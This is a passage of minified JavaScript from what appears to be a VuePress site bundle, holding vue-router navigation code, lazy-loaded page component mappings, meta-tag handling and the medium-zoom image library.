o&&Mr(n)&&(e=qr(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var Hr,Gr=jr&&((-1===(Hr=window.navigator.userAgent).indexOf("Android 2.")&&-1===Hr.indexOf("Android 4.0")||-1===Hr.indexOf("Mobile Safari")||-1!==Hr.indexOf("Chrome")||-1!==Hr.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function Wr(n,e){Or();var t=window.history;try{if(e){var o=Ra({},t.state);o.key=zr(),t.replaceState(o,"",n)}else t.pushState({key:Rr(Ir())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function Yr(n){Wr(n,!0)}function Jr(n,e,t){var o=function(a){a>=n.length?t():n[a]?e(n[a],(function(){o(a+1)})):o(a+1)};o(0)}var Xr={redirected:2,aborted:4,cancelled:8,duplicated:16};function Kr(n,e){return Zr(n,e,Xr.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return ns.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function Qr(n,e){return Zr(n,e,Xr.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function Zr(n,e,t,o){var a=new Error(o);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var ns=["params","query","hash"];function es(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function ts(n,e){return es(n)&&n._isRouter&&(null==e||n.type===e)}function os(n){return function(e,t,o){var a=!1,r=0,s=null;as(n,(function(n,e,t,i){if("function"==typeof n&&void 0===n.cid){a=!0,r++;var l,d=is((function(e){var a;((a=e).__esModule||ss&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:wr.extend(e),t.components[i]=e,--r<=0&&o()})),c=is((function(n){var e="Failed to resolve async component "+i+": "+n;s||(s=es(n)?n:new Error(e),o(s))}));try{l=n(d,c)}catch(n){c(n)}if(l)if("function"==typeof l.then)l.then(d,c);else{var p=l.component;p&&"function"==typeof p.then&&p.then(d,c)}}})),a||o()}}function as(n,e){return rs(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function rs(n){return Array.prototype.concat.apply([],n)}var ss="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function is(n){var e=!1;return function(){for(var t=[],o=arguments.length;o--;)t[o]=arguments[o];if(!e)return e=!0,n.apply(this,t)}}var ls=function(n,e){this.router=n,this.base=function(n){if(!n)if(jr){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=Ga,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function ds(n,e,t,o){var a=as(n,(function(n,o,a,r){var s=function(n,e){"function"!=typeof n&&(n=wr.extend(n));return n.options[e]}(n,e);if(s)return Array.isArray(s)?s.map((function(n){return t(n,o,a,r)})):t(s,o,a,r)}));return rs(o?a.reverse():a)}function cs(n,e){if(e)return function(){return n.apply(e,arguments)}}ls.prototype.listen=function(n){this.cb=n},ls.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},ls.prototype.onError=function(n){this.errorCbs.push(n)},ls.prototype.transitionTo=function(n,e,t){var o,a=this;try{o=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var r=this.current;this.confirmTransition(o,(function(){a.updateRoute(o),e&&e(o),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(o,r)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(o)})))}),(function(n){t&&t(n),n&&!a.ready&&(ts(n,Xr.redirected)&&r===Ga||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},ls.prototype.confirmTransition=function(n,e,t){var o=this,a=this.current;this.pending=n;var r,s,i=function(n){!ts(n)&&es(n)&&(o.errorCbs.length?o.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},l=n.matched.length-1,d=a.matched.length-1;if(Ja(n,a)&&l===d&&n.matched[l]===a.matched[d])return this.ensureURL(),n.hash&&Nr(this.router,a,n,!1),i(((s=Zr(r=a,n,Xr.duplicated,'Avoided redundant navigation to current location: "'+r.fullPath+'".')).name="NavigationDuplicated",s));var c=function(n,e){var t,o=Math.max(n.length,e.length);for(t=0;t<o&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),p=c.updated,u=c.deactivated,m=c.activated,h=[].concat(function(n){return ds(n,"beforeRouteLeave",cs,!0)}(u),this.router.beforeHooks,function(n){return ds(n,"beforeRouteUpdate",cs)}(p),m.map((function(n){return n.beforeEnter})),os(m)),v=function(e,t){if(o.pending!==n)return i(Qr(a,n));try{e(n,a,(function(e){!1===e?(o.ensureURL(!0),i(function(n,e){return Zr(n,e,Xr.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):es(e)?(o.ensureURL(!0),i(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(i(Kr(a,n)),"object"==typeof e&&e.replace?o.replace(e):o.push(e)):t(e)}))}catch(n){i(n)}};Jr(h,v,(function(){Jr(function(n){return ds(n,"beforeRouteEnter",(function(n,e,t,o){return function(n,e,t){return function(o,a,r){return n(o,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),r(n)}))}}(n,t,o)}))}(m).concat(o.router.resolveHooks),v,(function(){if(o.pending!==n)return i(Qr(a,n));o.pending=null,e(n),o.router.app&&o.router.app.$nextTick((function(){Ka(n)}))}))}))},ls.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},ls.prototype.setupListeners=function(){},ls.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=Ga,this.pending=null};var ps=function(n){function e(e,t){n.call(this,e,t),this._startLocation=us(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,o=Gr&&t;o&&this.listeners.push(Fr());var a=function(){var t=n.current,a=us(n.base);n.current===Ga&&a===n._startLocation||n.transitionTo(a,(function(n){o&&Nr(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var o=this,a=this.current;this.transitionTo(n,(function(n){Wr(er(o.base+n.fullPath)),Nr(o.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var o=this,a=this.current;this.transitionTo(n,(function(n){Yr(er(o.base+n.fullPath)),Nr(o.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(us(this.base)!==this.current.fullPath){var e=er(this.base+this.current.fullPath);n?Wr(e):Yr(e)}},e.prototype.getCurrentLocation=function(){return us(this.base)},e}(ls);function us(n){var e=window.location.pathname,t=e.toLowerCase(),o=n.toLowerCase();return!n||t!==o&&0!==t.indexOf(er(o+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var ms=function(n){function e(e,t,o){n.call(this,e,t),o&&function(n){var e=us(n);if(!/^\/#/.test(e))return window.location.replace(er(n+"/#"+e)),!0}(this.base)||hs()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=Gr&&e;t&&this.listeners.push(Fr());var o=function(){var e=n.current;hs()&&n.transitionTo(vs(),(function(o){t&&Nr(n.router,o,e,!0),Gr||fs(o.fullPath)}))},a=Gr?"popstate":"hashchange";window.addEventListener(a,o),this.listeners.push((function(){window.removeEventListener(a,o)}))}},e.prototype.push=function(n,e,t){var o=this,a=this.current;this.transitionTo(n,(function(n){gs(n.fullPath),Nr(o.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var o=this,a=this.current;this.transitionTo(n,(function(n){fs(n.fullPath),Nr(o.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;vs()!==e&&(n?gs(e):fs(e))},e.prototype.getCurrentLocation=function(){return vs()},e}(ls);function hs(){var n=vs();return"/"===n.charAt(0)||(fs("/"+n),!1)}function vs(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function bs(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function gs(n){Gr?Wr(bs(n)):window.location.hash=n}function fs(n){Gr?Yr(bs(n)):window.location.replace(bs(n))}var xs=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var o=this;this.transitionTo(n,(function(n){o.stack=o.stack.slice(0,o.index+1).concat(n),o.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var o=this;this.transitionTo(n,(function(n){o.stack=o.stack.slice(0,o.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var o=this.stack[t];this.confirmTransition(o,(function(){var n=e.current;e.index=t,e.updateRoute(o),e.router.afterHooks.forEach((function(e){e&&e(o,n)}))}),(function(n){ts(n,Xr.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(ls),ys=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=_r(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!Gr&&!1!==n.fallback,this.fallback&&(e="hash"),jr||(e="abstract"),this.mode=e,e){case"history":this.history=new ps(this,n.base);break;case"hash":this.history=new ms(this,n.base,this.fallback);break;case"abstract":this.history=new xs(this,n.base);break;default:0}},ws={currentRoute:{configurable:!0}};function Es(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}ys.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},ws.currentRoute.get=function(){return this.history&&this.history.current},ys.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof ps||t instanceof ms){var o=function(n){t.setupListeners(),function(n){var o=t.current,a=e.options.scrollBehavior;Gr&&a&&"fullPath"in n&&Nr(e,n,o,!1)}(n)};t.transitionTo(t.getCurrentLocation(),o,o)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},ys.prototype.beforeEach=function(n){return Es(this.beforeHooks,n)},ys.prototype.beforeResolve=function(n){return Es(this.resolveHooks,n)},ys.prototype.afterEach=function(n){return Es(this.afterHooks,n)},ys.prototype.onReady=function(n,e){this.history.onReady(n,e)},ys.prototype.onError=function(n){this.history.onError(n)},ys.prototype.push=function(n,e,t){var o=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){o.history.push(n,e,t)}));this.history.push(n,e,t)},ys.prototype.replace=function(n,e,t){var o=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){o.history.replace(n,e,t)}));this.history.replace(n,e,t)},ys.prototype.go=function(n){this.history.go(n)},ys.prototype.back=function(){this.go(-1)},ys.prototype.forward=function(){this.go(1)},ys.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},ys.prototype.resolve=function(n,e,t){var o=yr(n,e=e||this.history.current,t,this),a=this.match(o,e),r=a.redirectedFrom||a.fullPath;return{location:o,route:a,href:function(n,e,t){var o="hash"===t?"#"+e:e;return n?er(n+"/"+o):o}(this.history.base,r,this.mode),normalizedTo:o,resolved:a}},ys.prototype.getRoutes=function(){return this.matcher.getRoutes()},ys.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==Ga&&this.history.transitionTo(this.history.getCurrentLocation())},ys.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==Ga&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(ys.prototype,ws),ys.install=function n(e){if(!n.installed||wr!==e){n.installed=!0,wr=e;var t=function(n){return void 0!==n},o=function(n,e){var o=n.$options._parentVnode;t(o)&&t(o=o.data)&&t(o=o.registerRouteInstance)&&o(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,o(this,this)},destroyed:function(){o(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",Qa),e.component("RouterLink",kr);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},ys.version="3.5.4",ys.isNavigationFailure=ts,ys.NavigationFailureType=Xr,ys.START_LOCATION=Ga,jr&&window.Vue&&window.Vue.use(ys);var ks=ys;t(96);t(119);var As={NotFound:()=>t.e(56).then(t.bind(null,630)),Layout:()=>Promise.all([t.e(0),t.e(2)]).then(t.bind(null,629))},js={"v-4c947606":()=>t.e(57).then(t.bind(null,633)),"v-239fd83a":()=>t.e(59).then(t.bind(null,634)),"v-8db45cd6":()=>t.e(58).then(t.bind(null,635)),"v-e34bd69a":()=>t.e(42).then(t.bind(null,636)),"v-948c51ca":()=>t.e(43).then(t.bind(null,637)),"v-f9cc7df6":()=>t.e(60).then(t.bind(null,638)),"v-42d362c4":()=>t.e(5).then(t.bind(null,639)),"v-198b10d1":()=>t.e(28).then(t.bind(null,640)),"v-464604f5":()=>t.e(61).then(t.bind(null,641)),"v-69bdf3c6":()=>t.e(44).then(t.bind(null,642)),"v-4afda086":()=>t.e(11).then(t.bind(null,643)),"v-14900d75":()=>t.e(45).then(t.bind(null,644)),"v-19e944ef":()=>t.e(46).then(t.bind(null,645)),"v-7c2733f6":()=>t.e(62).then(t.bind(null,646)),"v-0c36c16a":()=>t.e(26).then(t.bind(null,647)),"v-f9e20114":()=>t.e(29).then(t.bind(null,648)),"v-2d5291f4":()=>t.e(15).then(t.bind(null,649)),"v-74228cbc":()=>t.e(19).then(t.bind(null,650)),"v-66c8ae85":()=>t.e(10).then(t.bind(null,651)),"v-8a9a8ecc":()=>t.e(38).then(t.bind(null,652)),"v-2beb3a85":()=>t.e(47).then(t.bind(null,653)),"v-36341369":()=>t.e(63).then(t.bind(null,654)),"v-94436878":()=>t.e(64).then(t.bind(null,655)),"v-71c49bdf":()=>t.e(65).then(t.bind(null,656)),"v-63eaf561":()=>t.e(3).then(t.bind(null,657)),"v-5b977d77":()=>t.e(9).then(t.bind(null,658)),"v-8a70ddc2":()=>t.e(20).then(t.bind(null,659)),"v-11941828":()=>t.e(21).then(t.bind(null,660)),"v-115f2139":()=>t.e(66).then(t.bind(null,661)),"v-493e907e":()=>t.e(22).then(t.bind(null,662)),"v-0671b2bb":()=>t.e(16).then(t.bind(null,663)),"v-75f6d2a5":()=>t.e(6).then(t.bind(null,664)),"v-2f71c012":()=>t.e(67).then(t.bind(null,665)),"v-b5548f06":()=>t.e(68).then(t.bind(null,666)),"v-1e5fcb02":()=>t.e(4).then(t.bind(null,667)),"v-2d9cdc8b":()=>t.e(69).then(t.bind(null,668)),"v-36d9da04":()=>t.e(30).then(t.bind(null,669)),"v-3a3bc896":()=>t.e(70).then(t.bind(null,670)),"v-de7a9464":()=>t.e(71).then(t.bind(null,671)),"v-0d9f8f99":()=>t.e(72).then(t.bind(null,672)),"v-71c07318":()=>t.e(31).then(t.bind(null,673)),"v-650d1a88":()=>t.e(48).then(t.bind(null,674)),"v-40fcf06a":()=>t.e(49).then(t.bind(null,675)),"v-638c9070":()=>t.e(73).then(t.bind(null,676)),"v-756eb3ee":()=>t.e(74).then(t.bind(null,677)),"v-6cd41a4a":()=>t.e(75).then(t.bind(null,678)),"v-5c5162cb":()=>t.e(76).then(t.bind(null,679)),"v-a280a600":()=>t.e(32).then(t.bind(null,680)),"v-40f75820":()=>t.e(77).then(t.bind(null,681)),"v-4e99b6d2":()=>t.e(78).then(t.bind(null,682)),"v-65d55112":()=>t.e(79).then(t.bind(null,683)),"v-404438b8":()=>t.e(12).then(t.bind(null,684)),"v-56a2b714":()=>t.e(13).then(t.bind(null,685)),"v-39b874c9":()=>t.e(39).then(t.bind(null,686)),"v-6d85c096":()=>t.e(50).then(t.bind(null,687)),"v-2d9f0b57":()=>t.e(14).then(t.bind(null,688)),"v-0d170c77":()=>t.e(40).then(t.bind(null,689)),"v-72468787":()=>t.e(80).then(t.bind(null,690)),"v-77e13159":()=>t.e(81).then(t.bind(null,691)),"v-9cc17058":()=>t.e(51).then(t.bind(null,692)),"v-26ff98bc":()=>t.e(82).then(t.bind(null,693)),"v-334ea931":()=>t.e(7).then(t.bind(null,694)),"v-645aefa2":()=>t.e(83).then(t.bind(null,695)),"v-89657368":()=>t.e(84).then(t.bind(null,696)),"v-72a7cb5d":()=>t.e(52).then(t.bind(null,697)),"v-47a7e265":()=>t.e(85).then(t.bind(null,698)),"v-18909b65":()=>t.e(23).then(t.bind(null,699)),"v-93c798ae":()=>t.e(86).then(t.bind(null,700)),"v-548b02db":()=>t.e(41).then(t.bind(null,701)),"v-4187e536":()=>t.e(24).then(t.bind(null,702)),"v-0e9188c2":()=>t.e(87).then(t.bind(null,703)),"v-daa52cfc":()=>t.e(53).then(t.bind(null,704)),"v-ed5b9394":()=>t.e(33).then(t.bind(null,705)),"v-68cece76":()=>t.e(54).then(t.bind(null,706)),"v-df549c9e":()=>t.e(88).then(t.bind(null,707)),"v-4b430b61":()=>t.e(17).then(t.bind(null,708)),"v-3850d23a":()=>t.e(18).then(t.bind(null,709)),"v-2020ddf2":()=>t.e(55).then(t.bind(null,710)),"v-72208521":()=>t.e(25).then(t.bind(null,711)),"v-55500e3a":()=>t.e(89).then(t.bind(null,712)),"v-add73d44":()=>t.e(90).then(t.bind(null,713)),"v-5c3f25c2":()=>t.e(91).then(t.bind(null,714)),"v-93e993f8":()=>t.e(92).then(t.bind(null,715)),"v-1d3d450c":()=>t.e(93).then(t.bind(null,716)),"v-22e1c1e0":()=>t.e(94).then(t.bind(null,717)),"v-4ef80a54":()=>t.e(8).then(t.bind(null,718)),"v-16e944a9":()=>t.e(27).then(t.bind(null,719)),"v-fdc5ab4e":()=>t.e(95).then(t.bind(null,720)),"v-25bb4771":()=>t.e(96).then(t.bind(null,721)),"v-4b6c4615":()=>t.e(97).then(t.bind(null,722)),"v-6d2971ec":()=>t.e(34).then(t.bind(null,723)),"v-2ac88107":()=>t.e(98).then(t.bind(null,724)),"v-0f8b7cba":()=>t.e(99).then(t.bind(null,725)),"v-44238a46":()=>t.e(100).then(t.bind(null,726)),"v-6bda811e":()=>t.e(101).then(t.bind(null,727)),"v-7ed37872":()=>t.e(102).then(t.bind(null,728)),"v-07dfe18d":()=>t.e(103).then(t.bind(null,729)),"v-040fd3b4":()=>t.e(104).then(t.bind(null,730)),"v-59315497":()=>t.e(105).then(t.bind(null,731)),"v-ecfff446":()=>t.e(106).then(t.bind(null,732))};function Ts(n){const e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}const Bs=/-(\w)/g,_s=Ts(n=>n.replace(Bs,(n,e)=>e?e.toUpperCase():"")),Ss=/\B([A-Z])/g,Cs=Ts(n=>n.replace(Ss,"-$1").toLowerCase()),Is=Ts(n=>n.charAt(0).toUpperCase()+n.slice(1));function Ds(n,e){if(!e)return;if(n(e))return n(e);return e.includes("-")?n(Is(_s(e))):n(Is(e))||n(Cs(e))}const zs=Object.assign({},As,js),Rs=n=>zs[n],Ls=n=>js[n],Fs=n=>As[n],Ns=n=>za.component(n);function Os(n){return Ds(Ls,n)}function Ps(n){return Ds(Fs,n)}function Ms(n){return Ds(Rs,n)}function qs(n){return Ds(Ns,n)}function Vs(...n){return Promise.all(n.filter(n=>n).map(async n=>{if(!qs(n)&&Ms(n)){const e=await Ms(n)();za.component(n,e.default)}}))}function $s(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var Us=t(86),Hs=t.n(Us),Gs=t(87),Ws=t.n(Gs),Ys={created(){if(this.siteMeta=this.$site.headTags.filter(([n])=>"meta"===n).map(([n,e])=>e),this.$ssrContext){const e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(n=e)?n.map(n=>{let e="<meta";return Object.keys(n).forEach(t=>{e+=` ${t}="${Ws()(n[t])}"`}),e+">"}).join("\n    "):"",this.$ssrContext.canonicalLink=Xs(this.$canonicalUrl)}var n},mounted(){this.currentMetaTags=[...document.querySelectorAll("meta")],this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta(){document.title=this.$title,document.documentElement.lang=this.$lang;const n=this.getMergedMetaTags();this.currentMetaTags=Ks(n,this.currentMetaTags)},getMergedMetaTags(){const n=this.$page.frontmatter.meta||[];return Hs()([{name:"description",content:this.$description}],n,this.siteMeta,Qs)},updateCanonicalLink(){Js(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",Xs(this.$canonicalUrl))}},watch:{$page(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy(){Ks(null,this.currentMetaTags),Js()}};function Js(){const n=document.querySelector("link[rel='canonical']");n&&n.remove()}function Xs(n=""){return n?`<link href="${n}" rel="canonical" />`:""}function Ks(n,e){if(e&&[...e].filter(n=>n.parentNode===document.head).forEach(n=>document.head.removeChild(n)),n)return n.map(n=>{const e=document.createElement("meta");return Object.keys(n).forEach(t=>{e.setAttribute(t,n[t])}),document.head.appendChild(e),e})}function Qs(n){for(const e of["name","property","itemprop"])if(n.hasOwnProperty(e))return n[e]+e;return JSON.stringify(n)}var Zs=t(22),ni=t.n(Zs),ei={mounted(){ni.a.configure({showSpinner:!1}),this.$router.beforeEach((n,e,t)=>{n.path===e.path||za.component(n.name)||ni.a.start(),t()}),this.$router.afterEach(()=>{ni.a.done(),this.isSidebarOpen=!1})}},ti=t(88),oi=t.n(ti),ai={mounted(){oi.a.polyfill()}},ri=(t(226),Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var o in t)Object.prototype.hasOwnProperty.call(t,o)&&(n[o]=t[o])}return n}),si=function(n){return"IMG"===n.tagName},ii=function(n){return n&&1===n.nodeType},li=function(n){return".svg"===(n.currentSrc||n.src).substr(-4).toLowerCase()},di=function(n){try{return Array.isArray(n)?n.filter(si):function(n){return NodeList.prototype.isPrototypeOf(n)}(n)?[].slice.call(n).filter(si):ii(n)?[n].filter(si):"string"==typeof n?[].slice.call(document.querySelectorAll(n)).filter(si):[]}catch(n){throw new TypeError("The provided selector is invalid.\nExpects a CSS selector, a Node element, a NodeList or an array.\nSee: https://github.com/francoischalifour/medium-zoom")}},ci=function(n){var e=document.createElement("div");return e.classList.add("medium-zoom-overlay"),e.style.background=n,e},pi=function(n){var e=n.getBoundingClientRect(),t=e.top,o=e.left,a=e.width,r=e.height,s=n.cloneNode(),i=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,l=window.pageXOffset||document.documentElement.scrollLeft||document.body.scrollLeft||0;return s.removeAttribute("id"),s.style.position="absolute",s.style.top=t+i+"px",s.style.left=o+l+"px",s.style.width=a+"px",s.style.height=r+"px",s.style.transform="",s},ui=function(n,e){var t=ri({bubbles:!1,cancelable:!1,detail:void 0},e);if("function"==typeof window.CustomEvent)return new CustomEvent(n,t);var o=document.createEvent("CustomEvent");return o.initCustomEvent(n,t.bubbles,t.cancelable,t.detail),o};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var o=document.head||document.getElementsByTagName("head")[0],a=document.createElement("style");a.type="text/css","top"===t&&o.firstChild?o.insertBefore(a,o.firstChild):o.appendChild(a),a.styleSheet?a.styleSheet.cssText=n:a.appendChild(document.createTextNode(n))}}(".medium-zoom-overlay{position:fixed;top:0;right:0;bottom:0;left:0;opacity:0;transition:opacity .3s;will-change:opacity}.medium-zoom--opened .medium-zoom-overlay{cursor:pointer;cursor:zoom-out;opacity:1}.medium-zoom-image{cursor:pointer;cursor:zoom-in;transition:transform .3s cubic-bezier(.2,0,.2,1)!important}.medium-zoom-image--hidden{visibility:hidden}.medium-zoom-image--opened{position:relative;cursor:pointer;cursor:zoom-out;will-change:transform}");var mi=function n(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},o=window.Promise||function(n){function e(){}n(e,e)},a=function(n){var e=n.target;e!==j?-1!==x.indexOf(e)&&v({target:e}):h()},r=function(){if(!w&&A.original){var n=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0;Math.abs(E-n)>k.scrollOffset&&setTimeout(h,150)}},s=function(n){var e=n.key||n.keyCode;"Escape"!==e&&"Esc"!==e&&27!==e||h()},i=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n;if(n.background&&(j.style.background=n.background),n.container&&n.container instanceof Object&&(e.container=ri({},k.container,n.container)),n.template){var t=ii(n.template)?n.template:document.querySelector(n.template);e.template=t}return k=ri({},k,e),x.forEach((function(n){n.dispatchEvent(ui("medium-zoom:update",{detail:{zoom:T}}))})),T},l=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return n(ri({},k,e))},d=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];var o=e.reduce((function(n,e){return[].concat(n,di(e))}),[]);return o.filter((function(n){return-1===x.indexOf(n)})).forEach((function(n){x.push(n),n.classList.add("medium-zoom-image")})),y.forEach((function(n){var e=n.type,t=n.listener,a=n.options;o.forEach((function(n){n.addEventListener(e,t,a)}))})),T},c=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];A.zoomed&&h();var o=e.length>0?e.reduce((function(n,e){return[].concat(n,di(e))}),[]):x;return o.forEach((function(n){n.classList.remove("medium-zoom-image"),n.dispatchEvent(ui("medium-zoom:detach",{detail:{zoom:T}}))})),x=x.filter((function(n){return-1===o.indexOf(n)})),T},p=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return x.forEach((function(o){o.addEventListener("medium-zoom:"+n,e,t)})),y.push({type:"medium-zoom:"+n,listener:e,options:t}),T},u=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return x.forEach((function(o){o.removeEventListener("medium-zoom:"+n,e,t)})),y=y.filter((function(t){return!(t.type==="medium-zoom:"+n&&t.listener.toString()===e.toString())})),T},m=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target,t=function(){var n={width:document.documentElement.clientWidth,height:document.documentElement.clientHeight,left:0,top:0,right:0,bottom:0},e=void 0,t=void 0;if(k.container)if(k.container instanceof Object)e=(n=ri({},n,k.container)).width-n.left-n.right-2*k.margin,t=n.height-n.top-n.bottom-2*k.margin;else{var o=(ii(k.container)?k.container:document.querySelector(k.container)).getBoundingClientRect(),a=o.width,r=o.height,s=o.left,i=o.top;n=ri({},n,{width:a,height:r,left:s,top:i})}e=e||n.width-2*k.margin,t=t||n.height-2*k.margin;var l=A.zoomedHd||A.original,d=li(l)?e:l.naturalWidth||e,c=li(l)?t:l.naturalHeight||t,p=l.getBoundingClientRect(),u=p.top,m=p.left,h=p.width,v=p.height,b=Math.min(d,e)/h,g=Math.min(c,t)/v,f=Math.min(b,g),x="scale("+f+") translate3d("+((e-h)/2-m+k.margin+n.left)/f+"px, "+((t-v)/2-u+k.margin+n.top)/f+"px, 0)";A.zoomed.style.transform=x,A.zoomedHd&&(A.zoomedHd.style.transform=x)};return new o((function(n){if(e&&-1===x.indexOf(e))n(T);else{if(A.zoomed)n(T);else{if(e)A.original=e;else{if(!(x.length>0))return void n(T);var o=x;A.original=o[0]}if(A.original.dispatchEvent(ui("medium-zoom:open",{detail:{zoom:T}})),E=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,w=!0,A.zoomed=pi(A.original),document.body.appendChild(j),k.template){var a=ii(k.template)?k.template:document.querySelector(k.template);A.template=document.createElement("div"),A.template.appendChild(a.content.cloneNode(!0)),document.body.appendChild(A.template)}if(document.body.appendChild(A.zoomed),window.requestAnimationFrame((function(){document.body.classList.add("medium-zoom--opened")})),A.original.classList.add("medium-zoom-image--hidden"),A.zoomed.classList.add("medium-zoom-image--opened"),A.zoomed.addEventListener("click",h),A.zoomed.addEventListener("transitionend",(function 